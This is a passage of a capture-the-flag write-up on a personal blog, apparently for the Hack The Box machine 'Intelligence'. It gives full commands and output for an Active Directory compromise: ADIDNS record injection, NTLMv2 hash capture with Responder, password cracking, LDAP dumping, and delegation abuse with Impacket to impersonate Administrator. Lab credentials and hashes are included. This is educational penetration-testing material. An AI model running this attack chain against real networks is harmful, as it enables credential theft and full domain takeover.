+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic"># Check web server status. Scheduled to run every 5min</span>
+</span></span><span style="display:flex;"><span>Import-Module ActiveDirectory
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">foreach</span>(<span style="color:#79c0ff">$record</span> <span style="color:#ff7b72">in</span> Get-ChildItem <span style="color:#a5d6ff">&#34;AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb&#34;</span> | Where-Object Name <span style="color:#ff7b72;font-weight:bold">-like</span> <span style="color:#a5d6ff">&#34;web*&#34;</span>)  {
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">try</span> {
+</span></span><span style="display:flex;"><span><span style="color:#79c0ff">$request</span> = Invoke-WebRequest -Uri <span style="color:#a5d6ff">&#34;http://</span>$(<span style="color:#79c0ff">$record</span>.Name)<span style="color:#a5d6ff">&#34;</span> -UseDefaultCredentials
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">if</span>(.<span style="color:#79c0ff">StatusCode</span> <span style="color:#ff7b72;font-weight:bold">-ne</span> <span style="color:#a5d6ff">200</span>) {
+</span></span><span style="display:flex;"><span>Send-MailMessage -From <span style="color:#a5d6ff">&#39;Ted Graves &lt;Ted.Graves@intelligence.htb&gt;&#39;</span> -To <span style="color:#a5d6ff">&#39;Ted Graves &lt;Ted.Graves@intelligence.htb&gt;&#39;</span> -Subject <span style="color:#a5d6ff">&#34;Host: </span>$(<span style="color:#79c0ff">$record</span>.Name)<span style="color:#a5d6ff"> is down&#34;</span>
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>} <span style="color:#ff7b72">catch</span> {}
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>This script appeared to be related to an earlier PDF found regarding an internal IT update:</p>
+<p><img src="web3.png" alt="Internal IT Update PDF"></p>
+<p>After a bit of research, it appears that the script utilizes Active Directory-Integrated DNS (ADIDNS), which might be exploitable in combination with the gift that keeps on giving: Responder. Essentially, any valid domain user can add a record to the DNS server by taking advantage of the insecure-by-default configurations of DNS dynamic updates. So long as a DNS record does not currently exist for a given domain, any valid domain user can create a domain record within the DNS server. For the purpose of exploiting this script, I can create a subdomain of <code>intelligence.htb</code> that begins with <code>web</code>. After doing so, the <code>Ted.Graves</code> user should attempt to connect to our domain and provide his credentials along with it. By running Responder, I should be able to catch the credentials coming across the wire:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>┌──<span style="color:#ff7b72;font-weight:bold">(</span>kali@kali<span style="color:#ff7b72;font-weight:bold">)</span>-<span style="color:#ff7b72;font-weight:bold">[</span>/opt<span style="color:#ff7b72;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span>└─$ python3 dnstool.py -u <span style="color:#a5d6ff">&#39;intelligence.htb\Tiffany.Molina&#39;</span> -p <span style="color:#a5d6ff">&#39;NewIntelligenceCorpUser9876&#39;</span> --record <span style="color:#a5d6ff">&#39;webbyboy.intelligence.htb&#39;</span> --action add --data 10.10.14.22 10.10.10.248
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>-<span style="color:#ff7b72;font-weight:bold">]</span> Connecting to host...
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>-<span style="color:#ff7b72;font-weight:bold">]</span> Binding to host
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>+<span style="color:#ff7b72;font-weight:bold">]</span> Bind OK
+</span></span><span style="display:flex;"><span>/opt/dnstool.py:241: DeprecationWarning: please use dns.resolver.Resolver.resolve<span style="color:#ff7b72;font-weight:bold">()</span> instead
+</span></span><span style="display:flex;"><span>    <span style="color:#79c0ff">res</span> <span style="color:#ff7b72;font-weight:bold">=</span> dnsresolver.query<span style="color:#ff7b72;font-weight:bold">(</span>zone, <span style="color:#a5d6ff">&#39;SOA&#39;</span><span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>-<span style="color:#ff7b72;font-weight:bold">]</span> Adding new record
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>+<span style="color:#ff7b72;font-weight:bold">]</span> LDAP operation completed successfully
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>┌──<span style="color:#ff7b72;font-weight:bold">(</span>kali@kali<span style="color:#ff7b72;font-weight:bold">)</span>-<span style="color:#ff7b72;font-weight:bold">[</span>/opt<span style="color:#ff7b72;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span>└─$ sudo responder -I tun0 -A -w
+</span></span><span style="display:flex;"><span>                                            __
+</span></span><span style="display:flex;"><span>    .----.-----.-----.-----.-----.-----.--|  |.-----.----.
+</span></span><span style="display:flex;"><span>    |   _|  -__|__ --|  _  |  _  |     |  _  <span style="color:#ff7b72;font-weight:bold">||</span>  -__|   _|
+</span></span><span style="display:flex;"><span>    |__| |_____|_____|   __|_____|__|__|_____<span style="color:#ff7b72;font-weight:bold">||</span>_____|__|
+</span></span><span style="display:flex;"><span>                    |__|
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            NBT-NS, LLMNR &amp; MDNS Responder 3.0.6.0
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    Author: Laurent Gaffie <span style="color:#ff7b72;font-weight:bold">(</span>laurent.gaffie@gmail.com<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span>    To kill this script hit CTRL-C
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>+<span style="color:#ff7b72;font-weight:bold">]</span> Poisoners:
+</span></span><span style="display:flex;"><span>    LLMNR                      <span style="color:#ff7b72;font-weight:bold">[</span>ON<span style="color:#ff7b72;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span>    NBT-NS                     <span style="color:#ff7b72;font-weight:bold">[</span>ON<span style="color:#ff7b72;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span>    DNS/MDNS                   <span style="color:#ff7b72;font-weight:bold">[</span>ON<span style="color:#ff7b72;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>+<span style="color:#ff7b72;font-weight:bold">]</span> Servers:
+</span></span><span style="display:flex;"><span>    HTTP server                <span style="color:#ff7b72;font-weight:bold">[</span>ON<span style="color:#ff7b72;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span>    HTTPS server               <span style="color:#ff7b72;font-weight:bold">[</span>ON<span style="color:#ff7b72;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span>    WPAD proxy                 <span style="color:#ff7b72;font-weight:bold">[</span>ON<span style="color:#ff7b72;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span>    Auth proxy                 <span style="color:#ff7b72;font-weight:bold">[</span>OFF<span style="color:#ff7b72;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span>    SMB server                 <span style="color:#ff7b72;font-weight:bold">[</span>ON<span style="color:#ff7b72;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span>    Kerberos server            <span style="color:#ff7b72;font-weight:bold">[</span>ON<span style="color:#ff7b72;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span>    SQL server                 <span style="color:#ff7b72;font-weight:bold">[</span>ON<span style="color:#ff7b72;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span>    FTP server                 <span style="color:#ff7b72;font-weight:bold">[</span>ON<span style="color:#ff7b72;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span>    IMAP server                <span style="color:#ff7b72;font-weight:bold">[</span>ON<span style="color:#ff7b72;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span>    POP3 server                <span style="color:#ff7b72;font-weight:bold">[</span>ON<span style="color:#ff7b72;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span>    SMTP server                <span style="color:#ff7b72;font-weight:bold">[</span>ON<span style="color:#ff7b72;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span>    DNS server                 <span style="color:#ff7b72;font-weight:bold">[</span>ON<span style="color:#ff7b72;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span>    LDAP server                <span style="color:#ff7b72;font-weight:bold">[</span>ON<span style="color:#ff7b72;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span>    RDP server                 <span style="color:#ff7b72;font-weight:bold">[</span>ON<span style="color:#ff7b72;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span>    DCE-RPC server             <span style="color:#ff7b72;font-weight:bold">[</span>ON<span style="color:#ff7b72;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span>    WinRM server               <span style="color:#ff7b72;font-weight:bold">[</span>ON<span style="color:#ff7b72;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>+<span style="color:#ff7b72;font-weight:bold">]</span> HTTP Options:
+</span></span><span style="display:flex;"><span>    Always serving EXE         <span style="color:#ff7b72;font-weight:bold">[</span>OFF<span style="color:#ff7b72;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span>    Serving EXE                <span style="color:#ff7b72;font-weight:bold">[</span>OFF<span style="color:#ff7b72;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span>    Serving HTML               <span style="color:#ff7b72;font-weight:bold">[</span>OFF<span style="color:#ff7b72;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span>    Upstream Proxy             <span style="color:#ff7b72;font-weight:bold">[</span>OFF<span style="color:#ff7b72;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>+<span style="color:#ff7b72;font-weight:bold">]</span> Poisoning Options:
+</span></span><span style="display:flex;"><span>    Analyze Mode               <span style="color:#ff7b72;font-weight:bold">[</span>ON<span style="color:#ff7b72;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span>    Force WPAD auth            <span style="color:#ff7b72;font-weight:bold">[</span>OFF<span style="color:#ff7b72;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span>    Force Basic Auth           <span style="color:#ff7b72;font-weight:bold">[</span>OFF<span style="color:#ff7b72;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span>    Force LM downgrade         <span style="color:#ff7b72;font-weight:bold">[</span>OFF<span style="color:#ff7b72;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span>    Fingerprint hosts          <span style="color:#ff7b72;font-weight:bold">[</span>OFF<span style="color:#ff7b72;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>+<span style="color:#ff7b72;font-weight:bold">]</span> Generic Options:
+</span></span><span style="display:flex;"><span>    Responder NIC              <span style="color:#ff7b72;font-weight:bold">[</span>tun0<span style="color:#ff7b72;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span>    Responder IP               <span style="color:#ff7b72;font-weight:bold">[</span>10.10.14.22<span style="color:#ff7b72;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span>    Challenge set              <span style="color:#ff7b72;font-weight:bold">[</span>random<span style="color:#ff7b72;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span>    Don<span style="color:#a5d6ff">&#39;t Respond To Names     [&#39;</span>ISATAP<span style="color:#f85149">&#39;</span><span style="color:#ff7b72;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>+<span style="color:#ff7b72;font-weight:bold">]</span> Current Session Variables:
+</span></span><span style="display:flex;"><span>    Responder Machine Name     <span style="color:#ff7b72;font-weight:bold">[</span>WIN-WCHKE328QTF<span style="color:#ff7b72;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span>    Responder Domain Name      <span style="color:#ff7b72;font-weight:bold">[</span>DAVC.LOCAL<span style="color:#ff7b72;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span>    Responder DCE-RPC Port     <span style="color:#ff7b72;font-weight:bold">[</span>47660<span style="color:#ff7b72;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>i<span style="color:#ff7b72;font-weight:bold">]</span> Responder is in analyze mode. No NBT-NS, LLMNR, MDNS requests will be poisoned.
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>Analyze mode: ICMP<span style="color:#ff7b72;font-weight:bold">]</span> You can ICMP Redirect on this network.
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>Analyze mode: ICMP<span style="color:#ff7b72;font-weight:bold">]</span> This workstation <span style="color:#ff7b72;font-weight:bold">(</span>10.10.14.22<span style="color:#ff7b72;font-weight:bold">)</span> is not on the same subnet than the DNS server <span style="color:#ff7b72;font-weight:bold">(</span>192.168.135.2<span style="color:#ff7b72;font-weight:bold">)</span>.
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>Analyze mode: ICMP<span style="color:#ff7b72;font-weight:bold">]</span> Use <span style="color:#a5d6ff">`</span>python tools/Icmp-Redirect.py<span style="color:#a5d6ff">`</span> <span style="color:#ff7b72">for</span> more details.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>+<span style="color:#ff7b72;font-weight:bold">]</span> Listening <span style="color:#ff7b72">for</span> events...
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>HTTP<span style="color:#ff7b72;font-weight:bold">]</span> NTLMv2 Client   : 10.10.10.248
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>HTTP<span style="color:#ff7b72;font-weight:bold">]</span> NTLMv2 Username : intelligence<span style="color:#79c0ff">\T</span>ed.Graves
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>HTTP<span style="color:#ff7b72;font-weight:bold">]</span> NTLMv2 Hash     : Ted.Graves::intelligence:1355a50d6b998e79:B6584DDE7414DA386C20ED1B1F01FF37:010100000000000039BE5EA912AAD70157DFD6F6383C5F4D0000000002000800440041005600430001001E00570049004E002D005700430048004B0045003300320038005100540046000400140044004100560043002E004C004F00430041004C0003003400570049004E002D005700430048004B00450033003200380051005400460
+</span></span><span style="display:flex;"><span>02E0044004100560043002E004C004F00430041004C000500140044004100560043002E004C004F00430041004C000800300030000000000000000000000000200000A25F64C5E61F8AE9A198A05240CE7D5651C530BC158F39379EAD070E0D00343E0A0010000000000000000000000000000000000009003C0048005400540050002F007700650062006200790062006F0079002E0069006E00740065006C006C006900670065006E00630065002E006800740062
+</span></span><span style="display:flex;"><span><span style="color:#a5d6ff">000000000000000000</span>
+</span></span></code></pre></div><p>As predicted, I successfully captured the credentials. I then attempted to crack the password hash for <code>Ted.Graves</code> using John:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>┌──<span style="color:#ff7b72;font-weight:bold">(</span>kali@kali<span style="color:#ff7b72;font-weight:bold">)</span>-<span style="color:#ff7b72;font-weight:bold">[</span>~/htb/intelligence<span style="color:#ff7b72;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span>└─$ john --wordlist<span style="color:#ff7b72;font-weight:bold">=</span>/usr/share/wordlists/rockyou.txt hash
+</span></span><span style="display:flex;"><span>Using default input encoding: UTF-8
+</span></span><span style="display:flex;"><span>Loaded <span style="color:#a5d6ff">1</span> password hash <span style="color:#ff7b72;font-weight:bold">(</span>netntlmv2, NTLMv2 C/R <span style="color:#ff7b72;font-weight:bold">[</span>MD4 HMAC-MD5 32/64<span style="color:#ff7b72;font-weight:bold">])</span>
+</span></span><span style="display:flex;"><span>Will run <span style="color:#a5d6ff">4</span> OpenMP threads
+</span></span><span style="display:flex;"><span>Press <span style="color:#a5d6ff">&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span style="color:#ff7b72">for</span> status
+</span></span><span style="display:flex;"><span>Mr.Teddy         <span style="color:#ff7b72;font-weight:bold">(</span>Ted.Graves<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span>1g 0:00:00:05 DONE <span style="color:#ff7b72;font-weight:bold">(</span>2021-09-14 22:18<span style="color:#ff7b72;font-weight:bold">)</span> 0.1872g/s 2025Kp/s 2025Kc/s 2025KC/s Mrz.deltasigma..Morgant1
+</span></span><span style="display:flex;"><span>Use the <span style="color:#a5d6ff">&#34;--show --format=netntlmv2&#34;</span> options to display all of the cracked passwords reliably
+</span></span><span style="display:flex;"><span>Session completed
+</span></span></code></pre></div><p>With newly captured credentials, I further enumerated the machine. The user didn’t have any additional access to SMB. However, the internal IT update associated with the PowerShell script enumerated earlier indicated that this user was likely a member of IT and has additional capabilities that <code>Tiffany.Molina</code> doesn&rsquo;t have. I leveraged the credentials to enumerate LDAP and dump all potentially useful information:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>┌──<span style="color:#ff7b72;font-weight:bold">(</span>kali@kali<span style="color:#ff7b72;font-weight:bold">)</span>-<span style="color:#ff7b72;font-weight:bold">[</span>~/htb/intelligence<span style="color:#ff7b72;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span>└─$ ldapdomaindump -u <span style="color:#a5d6ff">&#39;intelligence.htb\Ted.Graves&#39;</span> -p <span style="color:#a5d6ff">&#39;Mr.Teddy&#39;</span> -o ldap-dump 10.10.10.248
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>*<span style="color:#ff7b72;font-weight:bold">]</span> Connecting to host...
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>*<span style="color:#ff7b72;font-weight:bold">]</span> Binding to host
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>+<span style="color:#ff7b72;font-weight:bold">]</span> Bind OK
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>*<span style="color:#ff7b72;font-weight:bold">]</span> Starting domain dump
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>+<span style="color:#ff7b72;font-weight:bold">]</span> Domain dump finished
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#ff7b72;font-weight:bold">(</span>kali@kali<span style="color:#ff7b72;font-weight:bold">)</span>-<span style="color:#ff7b72;font-weight:bold">[</span>~/htb/intelligence<span style="color:#ff7b72;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span>└─$ cd ldap-dump
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#ff7b72;font-weight:bold">(</span>kali@kali<span style="color:#ff7b72;font-weight:bold">)</span>-<span style="color:#ff7b72;font-weight:bold">[</span>~/htb/intelligence/ldap-dump<span style="color:#ff7b72;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span>└─$ ls
+</span></span><span style="display:flex;"><span>domain_computers_by_os.html  domain_computers.html  domain_groups.grep  domain_groups.json  domain_policy.html  domain_trusts.grep  domain_trusts.json          domain_users.grep  domain_users.json
+</span></span><span style="display:flex;"><span>domain_computers.grep        domain_computers.json  domain_groups.html  domain_policy.grep  domain_policy.json  domain_trusts.html  domain_users_by_group.html  domain_users.html
+</span></span></code></pre></div><p>I was able to derive a complete user listing from the dump:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>┌──<span style="color:#ff7b72;font-weight:bold">(</span>kali@kali<span style="color:#ff7b72;font-weight:bold">)</span>-<span style="color:#ff7b72;font-weight:bold">[</span>~/htb/intelligence/ldap-dump<span style="color:#ff7b72;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span>└─$ cat domain_users.grep | awk -F<span style="color:#a5d6ff">&#34;\t&#34;</span> <span style="color:#a5d6ff">&#39;{print $3}&#39;</span> &gt; users.lst
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#ff7b72;font-weight:bold">(</span>kali@kali<span style="color:#ff7b72;font-weight:bold">)</span>-<span style="color:#ff7b72;font-weight:bold">[</span>~/htb/intelligence/ldap-dump<span style="color:#ff7b72;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span>└─$ cat users.lst
+</span></span><span style="display:flex;"><span>sAMAccountName
+</span></span><span style="display:flex;"><span>Ted.Graves
+</span></span><span style="display:flex;"><span>Laura.Lee
+</span></span><span style="display:flex;"><span>Jason.Patterson
+</span></span><span style="display:flex;"><span>Jeremy.Mora
+</span></span><span style="display:flex;"><span>James.Curbow
+</span></span><span style="display:flex;"><span>Tiffany.Molina
+</span></span><span style="display:flex;"><span>Jessica.Moody
+</span></span><span style="display:flex;"><span>Daniel.Shelton
+</span></span><span style="display:flex;"><span>Brian.Morris
+</span></span><span style="display:flex;"><span>Anita.Roberts
+</span></span><span style="display:flex;"><span>Jean.Walter
+</span></span><span style="display:flex;"><span>Joel.Crawford
+</span></span><span style="display:flex;"><span>Veronica.Patel
+</span></span><span style="display:flex;"><span>Thomas.Wise
+</span></span><span style="display:flex;"><span>William.Lee
+</span></span><span style="display:flex;"><span>Darryl.Harris
+</span></span><span style="display:flex;"><span>David.Wilson
+</span></span><span style="display:flex;"><span>Teresa.Williamson
+</span></span><span style="display:flex;"><span>Richard.Williams
+</span></span><span style="display:flex;"><span>Brian.Baker
+</span></span><span style="display:flex;"><span>Thomas.Hall
+</span></span><span style="display:flex;"><span>Thomas.Valenzuela
+</span></span><span style="display:flex;"><span>John.Coleman
+</span></span><span style="display:flex;"><span>Stephanie.Young
+</span></span><span style="display:flex;"><span>Nicole.Brock
+</span></span><span style="display:flex;"><span>Kelly.Long
+</span></span><span style="display:flex;"><span>Travis.Evans
+</span></span><span style="display:flex;"><span>Kaitlyn.Zimmerman
+</span></span><span style="display:flex;"><span>Jennifer.Thomas
+</span></span><span style="display:flex;"><span>Michelle.Kent
+</span></span><span style="display:flex;"><span>Ian.Duncan
+</span></span><span style="display:flex;"><span>David.Reed
+</span></span><span style="display:flex;"><span>Scott.Scott
+</span></span><span style="display:flex;"><span>David.Mcbride
+</span></span><span style="display:flex;"><span>Samuel.Richardson
+</span></span><span style="display:flex;"><span>Jason.Wright
+</span></span><span style="display:flex;"><span>Jose.Williams
+</span></span><span style="display:flex;"><span>Danny.Matthews
+</span></span><span style="display:flex;"><span>krbtgt
+</span></span><span style="display:flex;"><span>Guest
+</span></span><span style="display:flex;"><span>Administrator
+</span></span></code></pre></div><p>I attempted to identify kerberoastable users using Impacket’s <code>GetUserSPNs</code>, and the <code>krbtgt</code> user was, in fact, susceptible. Given the difficulty associated with cracking that particular account and the lack of success using the basic <code>rockyou.txt</code> file, I moved on to other escalation vectors.</p>
+<p>Another option I pursued was to find users with delegation privileges to the Domain Controller. If any existed, I could attempt to get a password hash or ticket for that respective user and attempt to crack the password offline. With delegation rights to the Domain Controller, I could impersonate any user on the domain.</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>┌──<span style="color:#ff7b72;font-weight:bold">(</span>kali@kali<span style="color:#ff7b72;font-weight:bold">)</span>-<span style="color:#ff7b72;font-weight:bold">[</span>~/htb/intelligence<span style="color:#ff7b72;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span>└─$ impacket-findDelegation -dc-ip 10.10.10.248 intelligence.htb/Ted.Graves:Mr.Teddy
+</span></span><span style="display:flex;"><span>Impacket v0.9.22 - Copyright <span style="color:#a5d6ff">2020</span> SecureAuth Corporation
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>AccountName  AccountType                          DelegationType                      DelegationRightsTo
+</span></span><span style="display:flex;"><span>-----------  -----------------------------------  ----------------------------------  -----------------------
+</span></span><span style="display:flex;"><span>svc_int$     ms-DS-Group-Managed-Service-Account  Constrained w/ Protocol Transition  WWW/dc.intelligence.htb
+</span></span></code></pre></div><p>The <code>Ted.Graves</code> user is in the <code>itsupport</code> Active Directory group, thereby allowing me to pull down the NTLM hash for that user. By passing the NTLM hash for the <code>svc_int</code> user, I used Impacket’s <code>getST</code> to impersonate the <code>Administrator</code> account and get a Kerberos ticket for the user.</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>┌──<span style="color:#ff7b72;font-weight:bold">(</span>kali@kali<span style="color:#ff7b72;font-weight:bold">)</span>-<span style="color:#ff7b72;font-weight:bold">[</span>~/htb/intelligence/gMSADumper<span style="color:#ff7b72;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span>└─$ impacket-getST intelligence.htb/svc_int$ -spn WWW/dc.intelligence.htb -hashes :5e47bac787e5e1970cf9acdb5b316239 -impersonate Administrator
+</span></span><span style="display:flex;"><span>Impacket v0.9.22 - Copyright <span style="color:#a5d6ff">2020</span> SecureAuth Corporation
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>*<span style="color:#ff7b72;font-weight:bold">]</span> Getting TGT <span style="color:#ff7b72">for</span> user
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>*<span style="color:#ff7b72;font-weight:bold">]</span> Impersonating Administrator
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>*<span style="color:#ff7b72;font-weight:bold">]</span>     Requesting S4U2self
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>*<span style="color:#ff7b72;font-weight:bold">]</span>     Requesting S4U2Proxy
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>*<span style="color:#ff7b72;font-weight:bold">]</span> Saving ticket in Administrator.ccache
+</span></span></code></pre></div><p>From there, gaining root access to the machine was as simple as logging in via SMB using the downloaded Kerberos ticket.</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>┌──<span style="color:#ff7b72;font-weight:bold">(</span>kali@kali<span style="color:#ff7b72;font-weight:bold">)</span>-<span style="color:#ff7b72;font-weight:bold">[</span>~/htb/intelligence/gMSADumper<span style="color:#ff7b72;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span>└─$ export <span style="color:#79c0ff">KRB5CCNAME</span><span style="color:#ff7b72;font-weight:bold">=</span>Administrator.ccache
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#ff7b72;font-weight:bold">(</span>kali@kali<span style="color:#ff7b72;font-weight:bold">)</span>-<span style="color:#ff7b72;font-weight:bold">[</span>~/htb/intelligence/gMSADumper<span style="color:#ff7b72;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span>└─$ impacket-smbclient -k intelligence.htb/Administrator@dc.intelligence.htb -no-pass
+</span></span><span style="display:flex;"><span>Impacket v0.9.22 - Copyright <span style="color:#a5d6ff">2020</span> SecureAuth Corporation
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Type help <span style="color:#ff7b72">for</span> list of commands
+</span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic"># shares</span>
+</span></span><span style="display:flex;"><span>ADMIN$
+</span></span><span style="display:flex;"><span>C$
+</span></span><span style="display:flex;"><span>IPC$
+</span></span><span style="display:flex;"><span>IT
+</span></span><span style="display:flex;"><span>NETLOGON
+</span></span><span style="display:flex;"><span>SYSVOL
+</span></span><span style="display:flex;"><span>Users
+</span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic"># who</span>
+</span></span><span style="display:flex;"><span>host:   <span style="color:#79c0ff">\\</span>10.10.14.22, user: Administrator, active:    25, idle:     <span style="color:#a5d6ff">1</span>
+</span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">#</span>
+</span></span></code></pre></div>
+      </div>
+
+
+      <footer>
+        
+
+
+        
+        
+        
+        
+        
+        
+        
+      </footer>
+    </article>
+
+    
+  </section>
+
+    </div>
+
+    <footer class="footer">
+  <section class="container">
+    ©
+    
+      2020 -
+    
+    2025
+     matt johnson 
+    ·
+    
+    Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> & <a href="https://github.com/luizdepra/hugo-coder/" target="_blank" rel="noopener">Coder</a>.
+    
+  </section>
+</footer>
+
+  </main>
+
